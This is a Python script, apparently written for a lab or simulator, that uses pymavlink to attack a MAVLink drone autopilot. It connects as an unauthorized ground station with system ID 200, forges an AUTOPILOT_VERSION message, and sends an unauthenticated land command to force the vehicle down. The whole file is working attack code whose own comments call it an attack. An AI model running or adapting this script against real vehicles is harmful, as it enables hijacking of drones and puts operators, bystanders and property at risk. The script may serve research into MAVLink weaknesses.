import os
os.environ["MAVLINK20"] = "0"
import subprocess
import time
from pymavlink import mavutil

# Force MAVLink 1.0 globally
mavutil.mavlink10()

# Establish attack connection with separate system ID
conn = mavutil.mavlink_connection(
    'udp:127.0.0.1:14553',
    source_system=200
)
conn.mav.WIRE_PROTOCOL_VERSION = "1.0"
conn.WIRE_PROTOCOL_VERSION = "1.0"
conn.mav.robust_parsing = False
mavutil.mavlink.WIRE_PROTOCOL_VERSION = "1.0"

conn.wait_heartbeat()
print("Connected as system ID:", conn.mav.srcSystem)
print("Target system:", conn.target_system)
print("Target component:", conn.target_component)

# Announce presence to autopilot as new GCS
conn.mav.heartbeat_send(
    mavutil.mavlink.MAV_TYPE_GCS,
    mavutil.mavlink.MAV_AUTOPILOT_INVALID,
    0, 0, 0
)
print("Heartbeat sent")

# Request AUTOPILOT_VERSION message
conn.mav.command_long_send(
    conn.target_system,
    conn.target_component,
    mavutil.mavlink.MAV_CMD_REQUEST_AUTOPILOT_CAPABILITIES,
    0,
    1,
    0, 0, 0, 0, 0, 0
)
print("AUTOPILOT_VERSION requested")

# Listen for the response
msg = conn.recv_match(type='AUTOPILOT_VERSION', blocking=True, timeout=5)
if msg:
    print("AUTOPILOT_VERSION received:")
    print(msg)
    conn.mav.autopilot_version_send(
        capabilities=56303,
        flight_sw_version=67633152,
        middleware_sw_version=0,
        os_sw_version=0,
        board_version=0,
        flight_custom_version=b'\x37\x31\x36\x30\x64\x65\x38\x32',
        middleware_custom_version=b'\x00\x00\x00\x00\x00\x00\x00\x00',
        os_custom_version=b'\x00\x00\x00\x00\x00\x00\x00\x00',
        vendor_id=0,
        product_id=0,
        uid=0
    )
    print("AUTOPILOT_VERSION sent")
    time.sleep(2)
    conn.mav.command_long_send(
        conn.target_system,
        conn.target_component,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0,
        0,
        0,
        0,
        0,
        0,
        0,
        0
    )
    print("LAND command sent from unauthorized system 200")
else:
    print("No response received")
